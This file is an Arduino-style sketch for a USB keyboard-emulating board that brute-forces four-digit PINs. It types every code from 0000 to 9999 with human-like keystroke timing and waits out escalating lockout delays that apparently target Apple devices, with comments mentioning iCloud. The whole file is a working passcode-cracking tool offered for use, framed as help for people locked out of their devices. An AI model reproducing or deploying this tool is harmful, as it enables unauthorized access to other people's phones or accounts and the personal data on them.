#include <usb_keyboard.h>
// This code is licensed under Apache 2.0 License
// http://www.apache.org/licenses/LICENSE-2.0.txt
// Limitation of Liability. In no event and under no legal theory,
// whether in tort (including negligence), contract, or otherwise,
// unless required by applicable law (such as deliberate and grossly
// negligent acts) or agreed to in writing, shall any Contributor be
// liable to You for damages, including any direct, indirect, special,
// incidental, or consequential damages of any character arising as a
// result of this License or out of the use or inability to use the
// Work (including but not limited to damages for loss of goodwill,
// work stoppage, computer failure or malfunction, or any and all
// other commercial damages or losses), even if such Contributor
// has been advised of the possibility of such damages.
// This code is indented for people who are not able to contact
// apple support and I am in no way liable for any damage or
// problems this code might cause.

const int ledPin = 13;

///// modify these values to narrow search range. /////
int startvalue = 0;
int endvalue = 9999;
///////////////////////////////////////////////////////

//waits for iCould
int waitloop = 1;
char pin[]="xxxx";

void setup() {
  pinMode(ledPin, OUTPUT);
  delay(10000);
  digitalWrite(ledPin, LOW);
}

void loop(){
  keyboard_modifier_keys = 0;
    
  switch (waitloop) {
  case 1 ... 5: // don't wait the first 5 attempts
    break;
  case 6: // wait 61 seconds on sixth try
    delay(61000); 
    break;
  case 7: // wait 5 minutes and 1 second on seventh try
    delay(301000);
    break;
  case 8: // wait 15 minutes and 1 second on eighth try
    delay(901000);
    digitalWrite(ledPin, HIGH);
    waitloop = 0;
    digitalWrite(ledPin, LOW);
    break;
  }

  //lets get to work
  if (startvalue <= endvalue) {
    delay(100503);
    digitalWrite(ledPin, LOW);
    delay(7049);
    digitalWrite(ledPin, HIGH);
    sprintf(pin, "%04d", startvalue);

    Keyboard.press(pin[0]);
    delay(450);
    Keyboard.release(pin[0]);
    delay(420);
    Keyboard.press(pin[1]);
    delay(398);
    Keyboard.release(pin[1]);
    delay(510);
    Keyboard.press(pin[2]);
    delay(421);
    Keyboard.release(pin[2]);
    delay(423);
    Keyboard.press(pin[3]);
    delay(430);
    Keyboard.release(pin[3]);
    delay(525);
    Keyboard.press(KEY_ENTER);
    delay(405);
    Keyboard.release(KEY_ENTER);
    digitalWrite(ledPin, LOW);
  }
  else {
    for (int blinkies = 0; blinkies < 8; blinkies++) {
      digitalWrite(ledPin, HIGH);
      delay(20);
      digitalWrite(ledPin, LOW);
      delay(200);
    }
    delay(6000);
  }

  digitalWrite(ledPin, HIGH);
  ++startvalue;
  ++waitloop;
  digitalWrite(ledPin, LOW);
}
